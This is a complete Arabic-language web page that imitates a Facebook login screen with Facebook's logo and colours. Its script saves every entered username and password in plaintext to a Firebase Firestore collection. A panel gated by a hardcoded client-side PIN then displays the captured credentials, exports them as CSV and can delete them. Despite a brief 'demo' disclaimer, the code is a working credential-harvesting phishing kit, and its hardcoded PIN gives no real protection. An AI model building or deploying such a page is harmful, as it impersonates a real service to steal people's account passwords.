<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>سجل الدخول عنّ طريقة Facebook</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:Segoe UI,Tahoma,Arial, sans-serif;background:linear-gradient(135deg,#1877f2 0%,#4e69a2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
    .container{background:#fff;border-radius:12px;max-width:700px;width:100%;padding:24px}
    .header{text-align:center;margin-bottom:18px}
    .logo{width:72px;height:72px;margin:0 auto 8px;border-radius:12px;background:#1877f2;display:flex;justify-content:center;align-items:center}
    .logo svg{width:40px;height:40px;fill:#fff}
    h1{font-size:20px;color:#222;margin-bottom:6px}
    .subtitle{font-size:13px;color:#666;margin-bottom:12px}
    .grid{display:grid;grid-template-columns:1fr 320px;gap:16px}
    form{background:#fafafa;padding:14px;border-radius:8px}
    label{display:block;margin-bottom:6px;font-weight:600;color:#333}
    input[type=text],input[type=password]{width:100%;padding:10px;border:1px solid #e3e3e3;border-radius:6px;margin-bottom:12px}
    button{display:inline-block;padding:10px 14px;border-radius:8px;border:none;background:#1877f2;color:#fff;font-weight:600;cursor:pointer}
    .admin-card{background:#fff;padding:12px;border-radius:8px}
    .msg{padding:10px;border-radius:6px;margin-bottom:10px;display:none}
    .msg.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb;display:block}
    .msg.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;display:block}
    #adminPanel{display:none;margin-top:12px}
    .log{background:#fff;padding:10px;border-radius:6px;margin-bottom:8px;border-right:4px solid #1877f2;word-break:break-word}
    .stats{display:flex;gap:8px;justify-content:space-between;margin-bottom:8px}
    .stat{background:#f6f8fb;padding:8px;border-radius:6px;text-align:center;flex:1}
    .small{background:#6c757d;padding:8px;border-radius:6px;color:#fff;border:none;cursor:pointer}
    @media(max-width:800px){.grid{grid-template-columns:1fr}}
  </style>
</head>
<body>
  <div class="container" role="main">
    <div class="header">
      <div class="logo" aria-hidden="true">
        <svg viewBox="0 0 24 24"><path d="M22.675 0h-21.35C.597 0 0 .597 0 1.325v21.351C0 23.403.597 24 1.325 24h11.49v-9.294H9.847V11.01h2.967V8.414c0-2.94 1.796-4.545 4.419-4.545 1.256 0 2.337.093 2.65.135v3.07h-1.82c-1.429 0-1.705.68-1.705 1.676v2.261h3.41l-.445 3.696h-2.965V24h5.813c.729 0 1.326-.597 1.326-1.324V1.325C24 .597 23.403 0 22.675 0z"/></svg>
      </div>
      <h1>سجل الدخول عنّ طريقة Facebook</h1>
      <div class="subtitle">نسخة تجريبية — البيانات ستحفظ على Firebase Firestore</div>
    </div>

    <div class="grid">
      <!-- Left: Login form -->
      <div>
        <form id="loginForm" aria-label="نموذج تسجيل الدخول">
          <label for="username">اسم المستخدم</label>
          <input id="username" type="text" placeholder="أدخل اسم المستخدم" required>
          <label for="password">كلمة المرور</label>
          <input id="password" type="password" placeholder="أدخل كلمة المرور" required>
          <div style="display:flex;gap:8px;align-items:center;margin-top:8px">
            <button type="submit" id="loginBtn">تسجيل الدخول</button>
            <button type="button" id="fbSim" class="small" title="محاكاة تسجيل دخول فيسبوك">محاكاة Facebook</button>
          </div>
          <div id="msg" class="msg"></div>
        </form>

        <div style="margin-top:12px;padding:12px;background:#fff;border-radius:8px">
          <strong>ملاحظات أمان:</strong>
          <ul style="margin-top:8px;padding-left:16px;color:#444">
            <li>هذه نسخة تجريبية. من الأفضل عدم إرسال كلمات سر حقيقية.</li>
            <li>لأمان حقيقي استخدم Firebase Authentication وHTTPS.</li>
          </ul>
        </div>
      </div>

      <!-- Right: Admin / PIN -->
      <div>
        <div class="admin-card">
          <div style="font-weight:700;margin-bottom:8px">عرض سجل التسجيلات (يتطلب PIN)</div>
          <label for="pin">أدخل الرمز (PIN)</label>
          <input id="pin" type="password" maxlength="6" placeholder="أدخل PIN">
          <div style="display:flex;gap:8px;margin-top:8px">
            <button id="showLogsBtn" class="small">عرض السجل</button>
            <button id="downloadCsv" class="small">تحميل CSV</button>
            <button id="clearLogsBtn" class="small" style="background:#dc3545">مسح</button>
          </div>
          <div id="pinMsg" class="msg" style="margin-top:8px"></div>
        </div>

        <div id="adminPanel" aria-live="polite">
          <div class="stats" style="margin-top:12px">
            <div class="stat"><div style="font-size:18px" id="total">0</div><div style="font-size:12px;color:#666">إجمالي المحاولات</div></div>
            <div class="stat"><div style="font-size:18px" id="unique">0</div><div style="font-size:12px;color:#666">مستخدمين مختلفين</div></div>
          </div>
          <div id="logsList"></div>
        </div>
      </div>
    </div>
  </div>

  <!-- Firebase SDKs -->
  <!-- 1) ضع إعدادات المشروع الخاصة بك في firebaseConfig المتغير أدناه -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>

  <script>
    // ======== إعداد Firebase ========
    // استبدل القيم هنا بقيم مشروعك من Console > Project settings
    const firebaseConfig = {
      apiKey: "YOUR_API_KEY",
      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
      projectId: "YOUR_PROJECT_ID",
      storageBucket: "YOUR_PROJECT_ID.appspot.com",
      messagingSenderId: "YOUR_SENDER_ID",
      appId: "YOUR_APP_ID"
    };

    // تهيئة
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // مفتاح اسم المجموعة
    const LOGS_COLLECTION = "login_logs_v1";
    const ADMIN_PIN = "1997";

    // DOM
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const msg = document.getElementById('msg');
    const fbSim = document.getElementById('fbSim');
    const pinInput = document.getElementById('pin');
    const showLogsBtn = document.getElementById('showLogsBtn');
    const logsList = document.getElementById('logsList');
    const adminPanel = document.getElementById('adminPanel');
    const totalEl = document.getElementById('total');
    const uniqueEl = document.getElementById('unique');
    const pinMsg = document.getElementById('pinMsg');
    const downloadCsv = document.getElementById('downloadCsv');
    const clearLogsBtn = document.getElementById('clearLogsBtn');

    function showMessage(el, text, type='success', timeout=3000){
      el.textContent = text;
      el.className = 'msg ' + (type==='success' ? 'success' : 'error');
      if(timeout) setTimeout(()=>{ el.style.display='none'; el.className='msg'; }, timeout);
      el.style.display='block';
    }

    // إضافة سجل إلى Firestore
    async function saveLogToFirestore(entry){
      try{
        await db.collection(LOGS_COLLECTION).add(entry);
        return true;
      }catch(err){
        console.error("Firestore write error:",err);
        return false;
      }
    }

    // استدعاء عند النقر تسجيل (حقيقي)
    loginForm.addEventListener('submit', async function(e){
      e.preventDefault();
      const username = usernameInput.value.trim();
      const password = passwordInput.value;
      if(!username || !password){ showMessage(msg,'الرجاء إدخال اسم المستخدم وكلمة المرور','error'); return; }
      const entry = { username, password, timestamp: new Date().toISOString() , ua: navigator.userAgent };
      // حفظ في Firestore
      const ok = await saveLogToFirestore(entry);
      if(ok){
        showMessage(msg,'✓ تم تسجيل الدخول وحفظه في السحابة','success');
        loginForm.reset();
      }else{
        showMessage(msg,'✗ حدث خطأ أثناء الحفظ. تحقق من إعداد Firebase في الكود','error');
      }
    });

    // زر محاكاة تسجيل فيسبوك (للاختبار)
    fbSim.addEventListener('click', async ()=>{
      const entry = { username: 'fb_user_'+Math.floor(Math.random()*1000), password: 'oauth_sim', timestamp: new Date().toISOString(), ua: navigator.userAgent };
      const ok = await saveLogToFirestore(entry);
      if(ok) showMessage(msg,'✓ تم إنشاء تسجيل تجريبي وحفظه','success');
      else showMessage(msg,'✗ خطأ في الحفظ','error');
    });

    // جلب السجلات وعرضها
    async function fetchLogsAndRender(){
      logsList.innerHTML = '<div class="log">جارٍ التحميل...</div>';
      try{
        const snapshot = await db.collection(LOGS_COLLECTION).orderBy('timestamp','desc').get();
        const docs = snapshot.docs.map(d=>({id:d.id, ...d.data()}));
        if(docs.length===0){
          logsList.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📭</div><p>لا توجد محاولات تسجيل دخول حتى الآن</p></div>';
          totalEl.textContent = '0'; uniqueEl.textContent='0';
          return;
        }
        totalEl.textContent = docs.length;
        const unique = new Set(docs.map(d=>d.username)).size;
        uniqueEl.textContent = unique;
        logsList.innerHTML = docs.map(d=>`<div class="log"><strong>اسم:</strong> ${escapeHtml(d.username)}<br><strong>كلمة السر:</strong> ${escapeHtml(d.password)}<div class="time">⏰ ${new Date(d.timestamp).toLocaleString()}</div></div>`).join('');
      }catch(err){
        console.error(err);
        logsList.innerHTML = '<div class="log">خطأ في جلب السجلات. تحقق من إعدادات Firebase.</div>';
      }
    }

    // زر عرض السجل - يتحقق من PIN
    showLogsBtn.addEventListener('click', async ()=>{
      const pin = pinInput.value.trim();
      pinMsg.style.display='none';
      if(pin!==ADMIN_PIN){ showMessage(pinMsg,'✗ الرمز غير صحيح','error'); return; }
      adminPanel.style.display='block';
      await fetchLogsAndRender();
    });

    // تنزيل CSV
    downloadCsv.addEventListener('click', async ()=>{
      const pin = pinInput.value.trim();
      if(pin!==ADMIN_PIN){ showMessage(pinMsg,'✗ الرمز غير صحيح','error'); return; }
      try{
        const snapshot = await db.collection(LOGS_COLLECTION).orderBy('timestamp','desc').get();
        const docs = snapshot.docs.map(d=>d.data());
        if(docs.length===0){ showMessage(pinMsg,'لا توجد سجلات للتحميل','error'); return; }
        const csv = toCSV(docs);
        const blob = new Blob([csv],{type:'text/csv;charset=utf-8;'});
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = 'login_logs.csv'; document.body.appendChild(a); a.click();
        URL.revokeObjectURL(url); a.remove();
      }catch(err){ console.error(err); showMessage(pinMsg,'حدث خطأ أثناء التحويل إلى CSV','error'); }
    });

    function toCSV(arr){
      const keys = ['username','password','timestamp','ua'];
      const rows = [keys.join(',')];
      arr.forEach(o=>{
        rows.push(keys.map(k=>`"${String(o[k]||'').replace(/"/g,'""')}"`).join(','));
      });
      return rows.join('\n');
    }

    // مسح السجلات (يحذف جميع الوثائق في المجموعة) -> يحتاج صلاحيات الكتابة
    clearLogsBtn.addEventListener('click', async ()=>{
      const pin = pinInput.value.trim();
      if(pin!==ADMIN_PIN){ showMessage(pinMsg,'✗ الرمز غير صحيح','error'); return; }
      if(!confirm('هل أنت متأكد من مسح جميع السجلات؟')) return;
      try{
        const snapshot = await db.collection(LOGS_COLLECTION).get();
        const batch = db.batch();
        snapshot.forEach(doc=> batch.delete(doc.ref));
        await batch.commit();
        showMessage(pinMsg,'✓ تم مسح السجلات','success');
        fetchLogsAndRender();
      }catch(err){ console.error(err); showMessage(pinMsg,'حدث خطأ أثناء المسح. تحقق من صلاحيات Firestore','error'); }
    });

    // وظيفة لتفادي XSS عند العرض
    function escapeHtml(s){ if(!s && s!=='') return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
  </script>
</body>
</html>
